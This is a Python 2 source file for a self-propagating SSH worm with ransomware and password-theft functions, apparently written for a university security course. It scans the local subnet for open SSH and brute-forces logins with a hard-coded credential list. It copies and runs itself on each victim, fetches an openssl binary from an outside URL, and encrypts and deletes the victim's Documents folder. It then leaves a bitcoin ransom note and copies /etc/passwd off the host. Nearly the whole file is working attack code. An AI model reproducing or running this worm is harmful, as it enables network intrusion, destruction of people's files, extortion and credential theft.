#!/usr/bin/env python2
############################
### Kevin Mittman         ##
### passwordthief_worm.py ##
############################

from subprocess import call
import os, sys
import fcntl, struct
import paramiko, socket
import netifaces, nmap
import urllib
import tarfile


# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
('cpsc', '123456'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

# Extort
URL = "http://ecs.fullerton.edu/~mgofman/openssl"
PATH = "/home/cpsc/Documents/"
RANSOM_FILE = "/tmp/ransom.txt"

###############################################################
# Steal password file
###############################################################
def upload(sshClient, host):
	try:
		sftpClient = sshClient.open_sftp()
	except AttributeError:
		pass

	try:
		remotepath =  "/etc/passwd"
		localpath = "/tmp/passwd_" + host
		sftpClient.get(remotepath, localpath)
		sftpClient.close()
	except IOError:
		pass

###############################################################
# Download the openSSL library
###############################################################
def download(sshClient):
	urllib.urlretrieve(URL, "/tmp/meow")
	try:
		sftpClient = sshClient.open_sftp()
	except AttributeError:
		pass

	try:
		remotepath =  "/tmp/meow"
		localpath = remotepath
		sftpClient.put(remotepath, localpath)
		sftpClient.close()
	except IOError:
		pass

###############################################################
# Archive important folder
###############################################################
def archive(sshClient):
	sshClient.exec_command("tar -czf exdir.tar.gz /home/cpsc/Documents/")

###############################################################
# Demand ransom
###############################################################
def extortCoins(sshClient):
	try:
		f = open(RANSOM_FILE, 'w')
		f.write("If you want your Documents back\n")
		f.write("Send 1.0 bitcoin to 1337hackerz@aol.ru\n")
		f.write("Or else!")
		f.close()
	except IOError:
		print("Permission denied")

	sftpClient = sshClient.open_sftp()
	sftpClient.put(RANSOM_FILE, "/home/cpsc/Desktop/RANSOM.txt")

###############################################################
# Encrypt important archive
###############################################################
def encryptSystem(sshClient):
	# Encrypt the tar.gz archive
	#sshClient.call(["chmod", "a+x", "/tmp/meow"])
	#sshClient.call(["/tmp/meow", "aes-256-cbc", "-a", "-salt", "-in", "exdir.tar.gz", "-out", "exdir.enc", "-k", "cs456worm"])

	sshClient.exec_command("chmod a+x /tmp/meow")
	sshClient.exec_command("/tmp/meow aes-256-cbc -a -salt -in exdir.tar.gz -out exdir.enc -k cs456worm")
	sshClient.exec_command("rm /home/cpsc/exdir.tar.gz")

	# Replace ~/Documents
	#shutil.rmtree('')
	sshClient.exec_command("rm -rf /home/cpsc/Documents/")
	sshClient.exec_command("mv /home/cpsc/exdir.enc /home/cpsc/Documents")

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	# Check if the system as infected. One
	# approach is to check for a file called
	# infected.txt in directory /tmp (which
	# you created when you marked the system
	# as infected). 
	return os.path.isfile(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	
	# Mark the system as infected. One way to do
	# this is to create a file called infected.txt
	# in directory /tmp/
	try:
	    open(INFECTED_MARKER_FILE, 'w').close()
	except IOError:
		print("Permission denied")

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	
	# This function takes as a parameter 
	# an instance of the SSH class which
	# was properly initialized and connected
	# to the victim system. The worm will
	# copy itself to remote system, change
	# its permissions to executable, and
	# execute itself. Please check out the
	# code we used for an in-class exercise.
	# The code which goes into this function
	# is very similar to that code.

	script = sys.argv[0]
	scriptPath = "/tmp/surprise"
	sftpClient = sshClient.open_sftp()
	sftpClient.put(script, scriptPath)
	sshClient.exec_command("chmod a+x /tmp/surprise")
	sshClient.exec_command("python2 /tmp/surprise")
	#sshClient.exec_command(call(["chmod", "a+x", scriptPath]))
	#sshClient.exec_command(call(["python2", scriptPath]))

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):
	
	# Tries to connect to host host using
	# the username stored in variable userName
	# and password stored in variable password
	# and instance of SSH class sshClient.
	# If the server is down	or has some other
	# problem, connect() function which you will
	# be using will throw socket.error exception.
	
	# print("ssh " + userName + ":" + password + "@" + host)

	try:
		sshClient.connect(host, username=userName, password=password)
	# Otherwise, if the credentials are not
	# correct, it will throw 
	# paramiko.SSHException exception. 
	# Otherwise, it opens a connection
	# to the victim system; sshClient now 
	# represents an SSH connection to the 
	# victim. Most of the code here will
	# be almost identical to what we did
	# during class exercise. Please make
	# sure you return the values as specified
	# in the comments above the function
	# declaration (if you choose to use
	# this skeleton).
	except paramiko.SSHException:
		# print("ERROR: Invalid credentials")
		return 1
	except socket.error:
		print("ERROR: Host down")
		return 3
	return 0

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):
	
	# The credential list
	global credList
	
	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()
	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	# The results of an attempt
	attemptResults = None
				
	# Go through the credentials
	for (username, password) in credList:
		
		# Call the tryCredentials function
		# to try to connect to the
		# remote system using the above 
		# credentials.  If tryCredentials
		# returns 0 then we know we have
		# successfully compromised the
		# victim. In this case we will
		# return a tuple containing an
		# instance of the SSH connection
		# to the remote system. 
		attemptResults = tryCredentials(host, username, password, ssh)
		if attemptResults == 0:			
			return (host, ssh)

	# Could not find working credentials
	return None	

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The UP address of the current system
####################################################
def getMyIP(interface=None):

	# The IP address
	ipAddr = None
	# Get all the network interfaces on the system
	networkInterfaces = netifaces.interfaces()

	# Go through all the interfaces
	for netFace in networkInterfaces:
		# The IP address of the interface
		addr = netifaces.ifaddresses(netFace)[2][0]['addr'] 
		# Get the IP address
		if not addr == "127.0.0.1":	
			# Save the IP addrss and break
			ipAddr = addr
			break	 
	return ipAddr

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	
	# Add code for scanning for hosts on the same network
	# and return the list of discovered IP addresses.	
	# Create an instance of the port scanner class
	portScanner = nmap.PortScanner()

	# Scan the network for systems whose
	# port 22 is open (that is, there is possibly
	# SSH running there). 
	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
	# Scan the network for hoss
	hostInfo = portScanner.all_hosts()	
	# The list of hosts that are up.
	liveHosts = []
	
	# Go trough all the hosts returned by nmap
	# and remove all who are not up and running
	for host in hostInfo:	
		# Is the host up?
		if portScanner[host].state() == "up":
			liveHosts.append(host)

	return liveHosts

# If we are being run without a command line parameters, 
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the 
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.

# Get the IP of the current system
myIP = getMyIP()

if len(sys.argv) < 2:
	# check if victim already infected
	if isInfectedSystem():
		print("Already pwned")
		exit(1)
	else:
		print("New acquisition")
		markInfected()
else:
	# If we are running on the victim, check if 
	# the victim was already infected. If so, terminate.
	# Otherwise, proceed with malice.
	if myIP == sys.argv[1]:
		print("Don't bite the hand that feeds you")
		markInfected()
	else:
		# check if victim already infected
		if isInfectedSystem():
			print("Already pwned")
			exit(1)
		else:
			print("New acquisition")
			markInfected()

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

# Remove the IP of the current system
# from the list of discovered systems (we
# do not want to target ourselves!).
networkHosts.remove(myIP)
print("Found hosts: ", networkHosts)

# Go through the network hosts
for host in networkHosts:
	# Try to attack this host
	sshInfo =  attackSystem(host)
	# print(sshInfo)
	
	# Did the attack succeed?
	if sshInfo:	
		print("Trying to spread")
		
		# Check if the system was	
		# already infected. This can be
		# done by checking whether the
		# remote system contains /tmp/infected.txt
		# file (which the worm will place there
		# when it first infects the system)
		# This can be done using code similar to
		# the code below:
		try:
			sftpClient = sshInfo[1].open_sftp()
		except AttributeError:
			pass

		victim = False
		try:
			remotepath = INFECTED_MARKER_FILE
			localpath = remotepath
			sftpClient.get(remotepath, localpath)
			sftpClient.close()
		except IOError:
			print("New victim found!")
			victim = True

		# If the system was already infected proceed.
		# Otherwise, infect the system and terminate.
		# Infect that system
		if victim:
			download(sshInfo[1])
			archive(sshInfo[1])
			encryptSystem(sshInfo[1])
			extortCoins(sshInfo[1])
			upload(sshInfo[1], host)

		spreadAndExecute(sshInfo[1])
		print("Spreading complete")
	
### END ###
